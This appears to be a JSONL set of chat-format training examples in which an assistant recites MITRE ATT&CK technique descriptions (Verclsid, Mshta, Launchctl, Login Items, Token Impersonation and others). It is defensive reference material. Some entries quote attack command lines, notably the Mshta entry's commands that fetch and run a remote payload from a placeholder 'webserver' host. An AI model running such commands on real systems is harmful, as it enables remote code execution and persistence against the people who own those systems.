{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Verclsid' and with the Id: T1218.012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Verclsid' and with the Id: T1218.012 is described as follows: Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub) . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Accounts' and with the Id: T1586 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Accounts' and with the Id: T1586 is described as follows: Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Launchctl' and with the Id: T1569.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Launchctl' and with the Id: T1569.001 is described as follows: Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Botnet' and with the Id: T1584.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Botnet' and with the Id: T1584.005 is described as follows: Adversaries may compromise numerous third-party systems to form a botnet\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Device CLI' and with the Id: T1059.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Device CLI' and with the Id: T1059.008 is described as follows: Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution). The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Bash History' and with the Id: T1552.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Bash History' and with the Id: T1552.003 is described as follows: Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way). The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Downgrade Attack' and with the Id: T1562.010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Downgrade Attack' and with the Id: T1562.010 is described as follows: Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system\u2019s backward compatibility to force it into less secure modes of operation. Adversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040).(Citation: Praetorian TLS Downgrade Attack 2014) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.(Citation: Targeted SSL Stripping Attacks Are Real)(Citation: Crowdstrike Downgrade). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'XPC Services' and with the Id: T1559.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'XPC Services' and with the Id: T1559.003 is described as follows: Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Virtualization/Sandbox Evasion' and with the Id: T1497 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Virtualization/Sandbox Evasion' and with the Id: T1497 is described as follows: Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015). The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Service' and with the Id: T1102 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Service' and with the Id: T1102 is described as follows: Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credentials In Files' and with the Id: T1552.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credentials In Files' and with the Id: T1552.001 is described as follows: Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP)In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage). The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DNS Calculation' and with the Id: T1568.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DNS Calculation' and with the Id: T1568.003 is described as follows: Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Mshta' and with the Id: T1218.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Mshta' and with the Id: T1218.005 is described as follows: Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Login Items' and with the Id: T1547.015 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Login Items' and with the Id: T1547.015 is described as follows: Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.Login items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the \u201cSystem Events\u201d process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application \u201cSystem Events\u201d to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Stage Capabilities' and with the Id: T1608 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Stage Capabilities' and with the Id: T1608 is described as follows: Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Link Target' and with the Id: T1608.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Link Target' and with the Id: T1608.005 is described as follows: Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001).Links can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.(Citation: Kaspersky-masking)(Citation: mandiant-masking)Adversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing)(Citation: Cofense-redirect) In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.(Citation: Talos IPFS 2022). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Multi-Stage Channels' and with the Id: T1104 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Multi-Stage Channels' and with the Id: T1104 is described as follows: Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Financial Theft' and with the Id: T1657 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Financial Theft' and with the Id: T1657 is described as follows: Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,(Citation: FBI-ransomware) business email compromise (BEC) and fraud,(Citation: FBI-BEC) \"pig butchering,\"(Citation: wired-pig butchering) bank hacking,(Citation: DOJ-DPRK Heist) and exploiting cryptocurrency networks.(Citation: BBC-Ronin) Adversaries may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) to conduct unauthorized transfers of funds.(Citation: Internet crime report 2022) In the case of business email compromise or email fraud, an adversary may utilize [Impersonation](https://attack.mitre.org/techniques/T1656) of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.(Citation: FBI-BEC) This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.(Citation: VEC)Extortion by ransomware may occur, for example, when an adversary demands payment from a victim after [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) (Citation: NYT-Colonial) and [Exfiltration](https://attack.mitre.org/tactics/TA0010) of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.(Citation: Mandiant-leaks) Adversaries may use dedicated leak sites to distribute victim data.(Citation: Crowdstrike-leaks)Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and business disruption.(Citation: AP-NotPetya). The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, SaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Execution Guardrails' and with the Id: T1480 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Execution Guardrails' and with the Id: T1480 is described as follows: Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Storage Object Discovery' and with the Id: T1619 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Storage Object Discovery' and with the Id: T1619 is described as follows: Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .. The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Cookies' and with the Id: T1606.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Cookies' and with the Id: T1606.001 is described as follows: Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019). The systems targeted by this attack pattern are: Linux, macOS, Windows, SaaS, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Log Enumeration' and with the Id: T1654 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Log Enumeration' and with the Id: T1654 is described as follows: Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).Host binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001) on Windows to access and/or export security event information.(Citation: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(Citation: Cadet Blizzard emerges as novel threat actor) In cloud environments, adversaries may leverage utilities such as the Azure VM Agent\u2019s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console)Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.. The systems targeted by this attack pattern are: Linux, macOS, Windows, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Token Impersonation/Theft' and with the Id: T1134.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Token Impersonation/Theft' and with the Id: T1134.001 is described as follows: Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration to Code Repository' and with the Id: T1567.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration to Code Repository' and with the Id: T1567.001 is described as follows: Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
